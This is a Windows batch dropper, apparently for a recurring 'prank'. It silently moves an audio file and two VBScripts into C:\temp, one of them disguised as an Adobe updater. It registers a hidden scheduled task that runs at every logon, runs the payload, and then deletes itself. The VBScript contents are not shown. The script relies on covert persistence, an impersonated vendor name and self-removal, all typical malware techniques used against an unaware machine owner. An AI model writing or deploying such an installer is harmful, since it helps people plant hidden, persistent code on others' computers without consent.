@echo off
:: Variables
set "targetDir=C:\temp"
set "vbsPath=%targetDir%\AdobeUpdater.vbs"
set "logicPath=%targetDir%\LogicMonitor.vbs"

:: Create the folder silently
if not exist "%targetDir%" mkdir "%targetDir%" >nul 2>&1

:: Move files to the target directory
move /y "%~dp0file.mp3" "%targetDir%\" >nul
move /y "%~dp0AdobeUpdater.vbs" "%vbsPath%" >nul
move /y "%~dp0LogicMonitor.vbs" "%logicPath%" >nul

:: Create the Master Task (LogicMonitor)
:: This runs at every Logon to check the calendar
schtasks /create /tn "LogicMonitor" /tr "wscript.exe \"%logicPath%\"" /sc onlogon /f >nul 2>&1

:: Run the LogicMonitor once immediately to set the first month's prank
wscript.exe "%logicPath%"

:: Self-destruct the setup file
del "%~f0"